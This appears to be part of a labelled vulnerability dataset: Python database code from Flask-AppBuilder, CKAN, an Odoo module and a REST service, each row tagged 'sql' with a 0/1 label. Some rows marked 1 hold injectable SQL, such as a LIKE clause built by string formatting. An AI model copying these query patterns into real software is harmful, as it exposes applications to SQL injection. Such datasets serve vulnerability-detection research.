        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/n/flask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",1,sql
20,4,f020853c54a1851f196d7fd8897c4620bccf9f6c,"ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query = str(text_query) # SQLObject chokes on unicode.
        return self.select(self.q.name.contains(text_query.lower()))


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",0,sql
21,5,f020853c54a1851f196d7fd8897c4620bccf9f6c,"/ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.
        # Todo: Change to use SQLObject statement objects.
        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",1,sql
22,164,91513ef7bbe60014dacab709be582eb0b10fcaab,"crapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from psycopg2.sql import SQL, Identifier
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state
            query = SQL(
                ""SELECT id, name FROM {} WHERE {} is NULL"".format(
                    Identifier(self._table), Identifier(column_name)
                )
            )
            self.env.cr.execute(query)
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})
                query = SQL(
                    ""UPDATE {} SET {}=%s WHERE id = %s"".format(
                        Identifier(self._table), Identifier(column_name)
                    )
                )
                self.env.cr.execute(query, (default_value.id, stage[0]))
/n/n/n",0,sql
23,165,91513ef7bbe60014dacab709be582eb0b10fcaab,"/crapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            self.env.cr.execute(
                ""SELECT id, name FROM %s WHERE %s is NULL"",
                (self._table, column_name),
            )
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})

                self.env.cr.execute(
                    ""UPDATE %s SET %s=%s WHERE id = %s"",
                    (self._table, column_name, default_value.id, stage[0]),
                )
/n/n/n",1,sql
24,30,b0b9410c36bce2e946d48695d9a0eca31b11c15a,"klassifikation/rest/db.py/n/nfrom enum import Enum

import psycopg2
from psycopg2.extras import DateTimeTZRange
from psycopg2.extensions import adapt as psyco_adapt

from jinja2 import Template
from jinja2 import Environment, FileSystemLoader

from settings import DATABASE, DB_USER
from db_helpers import get_attribute_fields, get_attribute_names
from db_helpers import get_state_names

""""""
    Jinja2 Environment
""""""

jinja_env = Environment(loader=FileSystemLoader('./templates/sql'))

def adapt(value):
    # return psyco_adapt(value)
    # Damn you, character encoding!
    return str(psyco_adapt(value.encode('utf-8'))).decode('utf-8')

jinja_env.filters['adapt'] = adapt

""""""
    GENERAL FUNCTION AND CLASS DEFINITIONS
""""""



def get_connection():
    """"""Handle all intricacies of connecting to Postgres.""""""
    connection = psycopg2.connect(""dbname={0} user={1}"".format(DATABASE,
                                                               DB_USER))
    connection.autocommit = True
    return connection


def get_authenticated_user():
    """"""Return hardcoded UUID until we get real authentication in place.""""""
    return ""615957e8-4aa1-4319-a787-f1f7ad6b5e2c""


def convert_attributes(attributes):
    ""Convert attributes from dictionary to list in correct order.""
    for attr_name in attributes:
        current_attr_periods = attributes[attr_name]
        converted_attr_periods = []
        for attr_period in current_attr_periods:
            field_names = get_attribute_fields(attr_name)
            attr_value_list = [
                attr_period[f] if f in attr_period else None
                for f in field_names
                ]
            converted_attr_periods.append(attr_value_list)
        attributes[attr_name] = converted_attr_periods
    return attributes


class Livscyklus(Enum):
    OPSTAAET = 'Opstaaet'
    IMPORTERET = 'Importeret'
    PASSIVERET = 'Passiveret'
    SLETTET = 'Slettet'
    RETTET = 'Rettet'


""""""
    GENERAL SQL GENERATION.

    All of these functions generate bits of SQL to use in complete statements.
    At some point, we might want to factor them to an ""sql_helpers.py"" module.
""""""


def sql_state_array(state, periods, class_name):
    """"""Return an SQL array of type <state>TilsType.""""""
    t = jinja_env.get_template('state_array.sql')
    sql = t.render(class_name=class_name, state_name=state,
                   state_periods=periods)
    return sql


def sql_attribute_array(attribute, periods):
    """"""Return an SQL array of type <attribute>AttrType[].""""""
    t = jinja_env.get_template('attribute_array.sql')
    sql = t.render(attribute_name=attribute, attribute_periods=periods)
    return sql


def sql_relations_array(class_name, relations):
    """"""Return an SQL array of type <class_name>RelationType[].""""""
    t = jinja_env.get_template('relations_array.sql')
    sql = t.render(class_name=class_name, relations=relations)
    return sql


def sql_convert_registration(states, attributes, relations, class_name):
    """"""Convert input JSON to the SQL arrays we need.""""""
    sql_states = []
    for s in get_state_names(class_name):
        periods = states[s] if s in states else []
        sql_states.append(
            sql_state_array(s, periods, class_name)
        )

    sql_attributes = []
    for a in get_attribute_names(class_name):
        periods = attributes[a] if a in attributes else []
        sql_attributes.append(
            sql_attribute_array(a, periods)
        )

    sql_relations = sql_relations_array(class_name, relations)

    return (sql_states, sql_attributes, sql_relations)


""""""
    GENRAL OBJECT RELATED FUNCTIONS
""""""


def object_exists(class_name, uuid):
    """"""Check if an object with this class name and UUID exists already.""""""
    sql = ""select (%s IN (SELECT DISTINCT facet_id from facet_registrering))""
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, (uuid,))
    result = cursor.fetchone()[0]
    
    return result


def create_or_import_object(class_name, note, attributes, states, relations,
                            uuid=None):
    """"""Create a new object by calling the corresponding stored procedure.

    Create a new object by calling actual_state_create_or_import_{class_name}.
    It is necessary to map the parameters to our custom PostgreSQL data types.
    """"""

    # Data from the BaseRegistration.
    # Do not supply date, that is generated by the DB.
    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None
                       else Livscyklus.IMPORTERET.value)
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)
    sql_template = jinja_env.get_template('create_object.sql')
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def delete_object(class_name, note, uuid):
    """"""Delete object by using the stored procedure.
    
    Deleting is the same as updating with the life cycle code ""Slettet"".
    """"""

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.SLETTET.value
    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]

def passivate_object(class_name, note, uuid):
    """"""Passivate object by calling the stored procedure.""""""

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.PASSIVERET.value
    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def update_object(class_name, note, attributes, states, relations, uuid=None):
    """"""Update object with the partial data supplied.""""""
    life_cycle_code = Livscyklus.RETTET.value
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)

    sql_template = jinja_env.get_template('update_object.sql')
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    try:
        cursor.execute(sql)
        output = cursor.fetchone()
        print output
    except psycopg2.DataError:
        # Thrown when no changes
        pass
    return uuid


def list_objects(class_name, uuid, virkning_fra, virkning_til,
                 registreret_fra, registreret_til):
    """"""List objects with the given uuids, optionally filtering by the given
    virkning and registering periods.""""""

    assert isinstance(uuid, list)

    sql_template = jinja_env.get_template('list_objects.sql')
    sql = sql_template.render(
        class_name=class_name
    )

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, {
        'uuid': uuid,
        'registrering_tstzrange': DateTimeTZRange(registreret_fra,
                                                  registreret_til),
        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)
    })
    output = cursor.fetchone()
    return output
/n/n/nklassifikation/rest/oio_rest.py/n/n
from flask import jsonify, request
import db


# Just a helper during debug
def j(t): return jsonify(output=t)


class OIOStandardHierarchy(object):
    """"""Implement API for entire hierarchy.""""""

    _classes = []

    @classmethod
    def setup_api(cls, flask, base_url):
        """"""Set up API for the classes included in the hierarchy.

        Note that version number etc. may have to be added to the URL.""""""
        for c in cls._classes:
            c.create_api(cls._name, flask, base_url)


class OIORestObject(object):
    """"""
    Implement an OIO object - manage access to database layer for this object.

    This class is intended to be subclassed, but not to be initialized.
    """"""

    @classmethod
    def create_object(cls):
        """"""
        CREATE object, generate new UUID.
        """"""
        if not request.json:
            return jsonify({'uuid': None}), 400
        note = request.json.get(""Note"", """")
        attributes = request.json.get(""Attributter"", {})
        states = request.json.get(""Tilstande"", {})
        relations = request.json.get(""Relationer"", {})
        uuid = db.create_or_import_object(cls.__name__, note, attributes,
                                          states, relations)
        return jsonify({'uuid': uuid}), 201

    @classmethod
    def get_objects(cls):
        """"""
        LIST or SEARCH facets, depending on parameters.
        """"""
        virkning_fra = request.args.get('virkningFra', None)
        virkning_til = request.args.get('virkningTil', None)
        registreret_fra = request.args.get('registreretFra', None)
        registreret_til = request.args.get('registreretTil', None)

        # TODO: Implement search

        uuid = request.args.get('uuid', None)
        if uuid is None:
            # This is not allowed, but we let the DB layer throw an exception
            uuid = []
        else:
            uuid = uuid.split(',')

        results = db.list_objects(cls.__name__, uuid, virkning_fra,
                                 virkning_til, registreret_fra,
                                 registreret_til)
        if results is None:
            results = []
        # TODO: Return JSON object key should be based on class name,
        # e.g. {""Facetter"": [..]}, not {""results"": [..]}
        # TODO: Include Return value
        return jsonify({'results': results})

    @classmethod
    def get_object(cls, uuid):
        """"""
        READ a facet, return as JSON.
        """"""
        return j(""Hent {0} fra databasen og returner som JSON"".format(uuid))

    @classmethod
    def put_object(cls, uuid):
        """"""
        UPDATE, IMPORT or PASSIVIZE an  object.
        """"""
        if not request.json:
            return jsonify({'uuid': None}), 400
        # Get most common parameters if available.
        note = request.json.get(""Note"", """")
        attributes = request.json.get(""Attributter"", {})
        states = request.json.get(""Tilstande"", {})
        relations = request.json.get(""Relationer"", {})

        if not db.object_exists(cls.__name__, uuid):
            # Do import.
            result = db.create_or_import_object(cls.__name__, note, attributes,
                                                states, relations, uuid)
            # TODO: When connected to DB, use result properly.
            return j(u""Importeret {0}: {1}"".format(cls.__name__, uuid)), 200
        else:
            ""Edit or passivate.""
            if (request.json.get('livscyklus', '').lower() == 'passiv'):
                # Passivate
                db.passivate_object(
                        cls.__name__, note, uuid
                )
                return j(
                            u""Passiveret {0}: {1}"".format(cls.__name__, uuid)
                        ), 200
            else:
                # Edit/change
                result = db.update_object(cls.__name__, note, attributes,
                                          states, relations, uuid)
                return j(u""Opdateret {0}: {1}"".format(cls.__name__, uuid)), 200
        return j(u""Forkerte parametre!""), 405

    @classmethod
    def delete_object(cls, uuid):
        # Delete facet
